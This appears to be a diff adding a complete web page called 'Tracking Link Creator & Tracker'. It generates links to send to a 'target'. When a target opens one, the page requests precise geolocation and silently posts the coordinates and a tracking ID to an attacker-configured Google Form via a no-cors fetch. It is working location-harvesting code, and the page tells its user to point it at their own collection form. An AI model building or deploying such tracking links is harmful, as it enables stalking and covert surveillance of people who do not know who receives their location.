@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Tracking Link Creator & Tracker</title>
+<style>
+  body {
+    margin: 0;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: #222;
+    color: #eee;
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+  }
+  header {
+    background: #4a148c;
+    padding: 1rem;
+    text-align: center;
+    font-weight: 700;
+    font-size: 1.5rem;
+    color: #ffd700;
+    text-shadow: 0 0 5px #ffd700;
+  }
+  main {
+    flex: 1;
+    padding: 1rem;
+    max-width: 900px;
+    margin: 0 auto;
+    width: 100%;
+  }
+  nav {
+    display: flex;
+    border-bottom: 2px solid #4a148c;
+    margin-bottom: 1rem;
+  }
+  nav button {
+    flex: 1;
+    background: transparent;
+    border: none;
+    padding: 0.75rem 1rem;
+    font-size: 1.1rem;
+    color: #ccc;
+    cursor: pointer;
+    border-bottom: 4px solid transparent;
+    transition: all 0.3s;
+  }
+  nav button.active {
+    color: #ffd700;
+    border-bottom-color: #ffd700;
+    font-weight: 700;
+  }
+  section {
+    display: none;
+  }
+  section.active {
+    display: block;
+  }
+
+  /* Link creator form */
+  label {
+    display: block;
+    margin: 0.5rem 0 0.2rem 0;
+    font-weight: 600;
+  }
+  input[type=text] {
+    width: 100%;
+    padding: 0.4rem 0.6rem;
+    font-size: 1rem;
+    border-radius: 6px;
+    border: 1px solid #555;
+    background: #333;
+    color: #eee;
+  }
+  button#createLinkBtn {
+    margin-top: 1rem;
+    background: #6a1b9a;
+    border: none;
+    padding: 0.6rem 1.2rem;
+    color: #fff;
+    font-weight: 700;
+    font-size: 1.1rem;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: background 0.3s;
+  }
+  button#createLinkBtn:hover {
+    background: #8e24aa;
+  }
+  #generatedLink {
+    margin-top: 1rem;
+    padding: 0.6rem;
+    background: #333;
+    border-radius: 6px;
+    word-break: break-all;
+    user-select: all;
+  }
+
+  /* Tracker UI */
+  #trackerMessage {
+    font-size: 1.2rem;
+    margin-bottom: 0.5rem;
+  }
+  #trackerCoords {
+    background: #444;
+    padding: 0.5rem 0.8rem;
+    border-radius: 8px;
+    display: inline-block;
+    user-select: all;
+    margin-bottom: 1rem;
+    font-family: monospace;
+  }
+  #trackerMap {
+    height: 350px;
+    border-radius: 16px;
+    box-shadow: 0 0 20px #4a148c;
+  }
+  footer {
+    text-align: center;
+    padding: 1rem;
+    font-size: 0.9rem;
+    color: #777;
+  }
+</style>
+
+<!-- Leaflet CSS for map -->
+<link
+  rel="stylesheet"
+  href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
+  crossorigin=""
+/>
+
+</head>
+<body>
+<header>Tracking Link Creator & Tracker</header>
+<main>
+  <nav>
+    <button id="tabCreate" class="active" aria-controls="createSection" aria-selected="true">Create Tracking Link</button>
+    <button id="tabTrack" aria-controls="trackSection" aria-selected="false">Tracker Page</button>
+  </nav>
+  <!-- Create Link Section -->
+  <section id="createSection" class="active" role="tabpanel" aria-labelledby="tabCreate">
+    <p>Enter a label or identifier for your tracking link (optional):</p>
+    <label for="trackingIdInput">Tracking ID:</label>
+    <input type="text" id="trackingIdInput" placeholder="e.g. campaign1, userxyz" autocomplete="off" />
+    <button id="createLinkBtn">Generate Tracking Link</button>
+    <div id="generatedLink" aria-live="polite" role="region" hidden></div>
+    <p style="margin-top:1rem; font-size:0.9rem; color:#aaa;">
+      The generated link can be sent to your target. When opened, it will ask for location permission and send data to the Google Form linked inside.<br/>
+      Replace the form endpoint in code for your own collection.
+    </p>
+  </section>
+  <!-- Tracking Page Section -->
+  <section id="trackSection" role="tabpanel" aria-labelledby="tabTrack">
+    <h2>Tracker Page Preview</h2>
+    <p id="trackerMessage">Loading...</p>
+    <div id="trackerCoords"></div>
+    <div id="trackerMap" style="display:none;"></div>
+  </section>
+</main>
+<footer>
+  &copy; 2024 Your Company | Use only with consent.
+</footer>
+
+<!-- Leaflet JS for map on tracker -->
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" crossorigin=""></script>
+
+<script>
+(() => {
+  // Tabs switching
+  const tabCreate = document.getElementById('tabCreate');
+  const tabTrack = document.getElementById('tabTrack');
+  const createSection = document.getElementById('createSection');
+  const trackSection = document.getElementById('trackSection');
+
+  tabCreate.addEventListener('click', () => {
+    tabCreate.classList.add('active');
+    tabCreate.setAttribute('aria-selected','true');
+    tabTrack.classList.remove('active');
+    tabTrack.setAttribute('aria-selected','false');
+    createSection.classList.add('active');
+    trackSection.classList.remove('active');
+  });
+
+  tabTrack.addEventListener('click', () => {
+    tabTrack.classList.add('active');
+    tabTrack.setAttribute('aria-selected','true');
+    tabCreate.classList.remove('active');
+    tabCreate.setAttribute('aria-selected','false');
+    trackSection.classList.add('active');
+    createSection.classList.remove('active');
+  });
+
+  // Link generator
+  const trackingIdInput = document.getElementById('trackingIdInput');
+  const createLinkBtn = document.getElementById('createLinkBtn');
+  const generatedLinkDiv = document.getElementById('generatedLink');
+
+  createLinkBtn.addEventListener('click', () => {
+    const id = trackingIdInput.value.trim() || 'default';
+    // Construct the link (simulate tracker page + param)
+    // The idea: user sends a link like: https://yourwebsite.com/index.html?trackId=id
+    // Here we will just simulate it with current URL + param
+    const baseUrl = window.location.origin + window.location.pathname;
+    const fullUrl = baseUrl + '?trackId=' + encodeURIComponent(id);
+    generatedLinkDiv.textContent = fullUrl;
+    generatedLinkDiv.hidden = false;
+  });
+
+  // Tracker page logic running automatically if url has ?trackId=xxx
+  const urlParams = new URLSearchParams(window.location.search);
+  const trackId = urlParams.get('trackId');
+
+  const trackerMessage = document.getElementById('trackerMessage');
+  const trackerCoords = document.getElementById('trackerCoords');
+  const trackerMap = document.getElementById('trackerMap');
+  let map, marker;
+
+  function showTrackerLocation(lat, lng) {
+    trackerCoords.textContent = `Latitude: ${lat.toFixed(6)}, Longitude: ${lng.toFixed(6)}`;
+    trackerMap.style.display = 'block';
+
+    if (!map) {
+      map = L.map('trackerMap').setView([lat, lng], 13);
+
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        maxZoom: 19,
+        attribution: '&copy; OpenStreetMap contributors'
+      }).addTo(map);
+
+      marker = L.marker([lat, lng]).addTo(map)
+        .bindPopup('Your Location')
+        .openPopup();
+    } else {
+      map.setView([lat, lng], 13);
+      marker.setLatLng([lat, lng]);
+      marker.openPopup();
+    }
+  }
+
+  function sendLocationToGoogleForm(lat, lng, id) {
+    // Replace with your Google Form details:
+    // Example Google Form URL and field names
+    const googleFormUrl = 'https://docs.google.com/forms/d/e/1FAIpQLSfXxxxxxxx/formResponse';
+
+    // The entry id for each field in form: get from Google Form source or setup your own form
+    const entryLat = 'entry.1234567890';   // Replace with your form's entry field for latitude
+    const entryLng = 'entry.0987654321';   // Replace with your form's entry field for longitude
+    const entryId = 'entry.1122334455';    // Replace with your form's entry field for tracking id or label
+
+    // Build the query parameters for GET request
+    const submitUrl = googleFormUrl + `?${entryLat}=${encodeURIComponent(lat)}&${entryLng}=${encodeURIComponent(lng)}&${entryId}=${encodeURIComponent(id)}`;
+
+    // Send data by creating an Image object to avoid CORS or use fetch POST with mode no-cors
+    // Using fetch with no-cors, cannot check response
+    fetch(submitUrl, {mode: 'no-cors'}).catch(() => {
+      // Silently fail
+    });
+  }
+
+  async function getLocationAndReport() {
+    if (!navigator.geolocation) {
+      trackerMessage.textContent = 'Geolocation is not supported by your browser.';
+      trackerCoords.textContent = '';
+      return;
+    }
+
+    trackerMessage.textContent = 'Requesting your location... Please allow permission.';
+    try {
+      const pos = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+          enableHighAccuracy: true,
+          timeout: 15000,
+          maximumAge: 0
+        });
+      });
+
+      trackerMessage.textContent = 'Location acquired:';
+      const lat = pos.coords.latitude;
+      const lng = pos.coords.longitude;
+      showTrackerLocation(lat, lng);
+      if(trackId) {
+        sendLocationToGoogleForm(lat, lng, trackId);
+        trackerMessage.textContent += ' Your location has been sent to the server.';
+      } else {
+        trackerMessage.textContent += ' No tracking ID found.';
+      }
+    } catch (err) {
+      switch(err.code) {
+        case err.PERMISSION_DENIED:
+          trackerMessage.textContent = 'Permission denied to access location.';
+          break;
+        case err.POSITION_UNAVAILABLE:
+          trackerMessage.textContent = 'Location information is unavailable.';
+          break;
+        case err.TIMEOUT:
+          trackerMessage.textContent = 'Request for location timed out.';
+          break;
+        default:
+          trackerMessage.textContent = 'An unknown error occurred while obtaining location.';
+      }
+      trackerCoords.textContent = '';
+      trackerMap.style.display = 'none';
+    }
+  }
+
+  // On page load if trackId param exists, switch to tracker tab and run
+  if(trackId) {
+    tabTrack.click();
+    getLocationAndReport();
+  }
+})();
+</script>
+
+</body>
+</html>
+
